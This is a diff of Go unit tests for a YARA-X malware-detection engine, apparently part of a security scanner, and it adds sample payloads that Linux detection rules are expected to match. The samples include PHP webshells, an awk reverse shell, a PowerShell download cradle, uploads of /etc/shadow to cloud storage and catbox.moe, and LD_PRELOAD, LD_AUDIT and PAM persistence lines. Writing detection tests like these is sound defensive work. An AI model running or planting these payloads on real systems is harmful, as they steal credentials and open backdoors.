@@ -637,9 +637,9 @@ func TestYaraX_EmbeddedCoreLinuxRules(t *testing.T) {
 		},
 		{
 			ruleName: "Linux_Implant_RedTeam_Persistence_Framework",
-			path:     "/tmp/ghost.sh",
-			filename: "ghost.sh",
-			payload:  []byte("#!/bin/bash\n# GHOST-SHELL v4.0\n# TIER-1 RED TEAM IMPLANT\n"),
+			path:     "/tmp/persist.sh",
+			filename: "persist.sh",
+			payload:  []byte("#!/bin/bash\nmkfifo /tmp/.gs_pipe_1; /bin/bash < /tmp/.gs_pipe_1\n"),
 		},
 		{
 			ruleName: "Linux_Rootkit_LDPRELOAD_Hook_Artifact",
@@ -683,6 +683,30 @@ func TestYaraX_EmbeddedCoreLinuxRules(t *testing.T) {
 			filename: "srv.py",
 			payload:  []byte("import socket, zlib\ns = socket.socket()\ns.bind(('0.0.0.0', 4444))\ns.listen(5)\nconn, _ = s.accept()\ndata = conn.recv(1024)\nstolen = zlib.decompress(data)\n"),
 		},
+		{
+			ruleName: "Linux_Script_PowerShell_Encoded_Execution",
+			path:     "/tmp/ps.sh",
+			filename: "ps.sh",
+			payload:  []byte("pwsh -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=\n"),
+		},
+		{
+			ruleName: "Linux_Script_Cloud_Exfiltration_Tool",
+			path:     "/tmp/sync.sh",
+			filename: "sync.sh",
+			payload:  []byte("rclone sync /etc/shadow remote:backup/data.tar.gz\n"),
+		},
+		{
+			ruleName: "Linux_Persistence_Linker_Audit_Hijack",
+			path:     "/etc/profile.d/audit.sh",
+			filename: "audit.sh",
+			payload:  []byte("export LD_AUDIT=/opt/stealth/libaudit.so\n"),
+		},
+		{
+			ruleName: "Linux_Persistence_PAM_Exec_Suspicious",
+			path:     "/etc/pam.d/common-auth",
+			filename: "common-auth",
+			payload:  []byte("auth optional pam_exec.so /tmp/.session_logger.sh\n"),
+		},
 	}
 
 	for _, tc := range tests {
@@ -709,6 +733,99 @@ func TestYaraX_EmbeddedCoreLinuxRules(t *testing.T) {
 	}
 }
 
+func TestYaraX_EmbeddedCoreLinuxRules_BroadenedVariants(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+	engine := NewYaraXEngine(cfg, nil, false)
+	defer engine.Close()
+
+	if err := engine.LoadRules(nil); err != nil {
+		t.Fatalf("LoadRules failed: %v", err)
+	}
+
+	cov := engine.Coverage()
+	if !cov.CompiledIn {
+		t.Skip("YARA-X engine not compiled in")
+	}
+
+	scanner := engine.NewScanner()
+	defer scanner.Destroy()
+
+	variants := []struct {
+		name     string
+		ruleName string
+		payload  []byte
+	}{
+		{
+			name:     "PHP webshell variable indirection",
+			ruleName: "Linux_Webshell_PHP_Generic_Backdoor",
+			payload:  []byte("<?php $cmd = $_POST['c']; eval($cmd); ?>"),
+		},
+		{
+			name:     "PHP webshell callback execution",
+			ruleName: "Linux_Webshell_PHP_Generic_Backdoor",
+			payload:  []byte("<?php call_user_func('system', $_GET['x']); ?>"),
+		},
+		{
+			name:     "Awk reverse shell",
+			ruleName: "Linux_Backdoor_Reverse_Shell_OneLiner",
+			payload:  []byte("awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4444\"; while (42) { do{ printf \"shell>\" |& s; s |& getline c; } while (c != \"exit\") close(s); }}'"),
+		},
+		{
+			name:     "Stealth procfs tmpfs mount",
+			ruleName: "Linux_Implant_RedTeam_Persistence_Framework",
+			payload:  []byte("mount -t tmpfs tmpfs /proc/$$"),
+		},
+		{
+			name:     "s5cmd cloud exfil tool",
+			ruleName: "Linux_Script_Cloud_Exfiltration_Tool",
+			payload:  []byte("s5cmd cp /etc/shadow s3://threat-bucket/\n"),
+		},
+		{
+			name:     "catbox curl exfil upload",
+			ruleName: "Linux_Script_Cloud_Exfiltration_Tool",
+			payload:  []byte("curl -F file=@/etc/shadow https://catbox.moe/api/upload.php\n"),
+		},
+		{
+			name:     "systemd Environment LD_PRELOAD injection",
+			ruleName: "Linux_Persistence_Linker_Audit_Hijack",
+			payload:  []byte("[Service]\nEnvironment=\"LD_PRELOAD=/opt/libaudit.so\"\n"),
+		},
+		{
+			name:     "ld.so.preload file reference",
+			ruleName: "Linux_Persistence_Linker_Audit_Hijack",
+			payload:  []byte("# Global dynamic linker preload\n/etc/ld.so.preload\n"),
+		},
+		{
+			name:     "PAM exec with seteuid elevated privileges",
+			ruleName: "Linux_Persistence_PAM_Exec_Suspicious",
+			payload:  []byte("auth required pam_exec.so seteuid /usr/local/bin/custom_authenticator\n"),
+		},
+	}
+
+	for _, tc := range variants {
+		t.Run(tc.name, func(t *testing.T) {
+			matches, err := scanner.Scan(ScanTarget{
+				Path:     "/tmp/test_variant",
+				Filename: "test_variant",
+				Data:     tc.payload,
+			})
+			if err != nil {
+				t.Fatalf("scan error for %s: %v", tc.name, err)
+			}
+			found := false
+			for _, m := range matches {
+				if m.RuleName == tc.ruleName {
+					found = true
+					break
+				}
+			}
+			if !found {
+				t.Errorf("expected match for rule %s, got: %v", tc.ruleName, matches)
+			}
+		})
+	}
+}
+
 type mockYaraPkgDB struct {
 	owners map[string]string
 }
@@ -719,6 +836,10 @@ func (m *mockYaraPkgDB) Owner(path string) (string, bool) {
 	}
 	owner, ok := m.owners[path]
 	return owner, ok
+}
+
+func (m *mockYaraPkgDB) VerifyDigest(path string, actualMD5 string) (bool, string, bool) {
+	return true, "", false
 }
 
 func (m *mockYaraPkgDB) IsAvailable() bool  { return true }
@@ -752,7 +873,3 @@ func TestYaraX_PackageOwnedAndDocContext_VerdictSafe(t *testing.T) {
 		t.Errorf("expected package unit test severity NOTICE, got %s", fTest.Severity)
 	}
 }
-
-
-
-
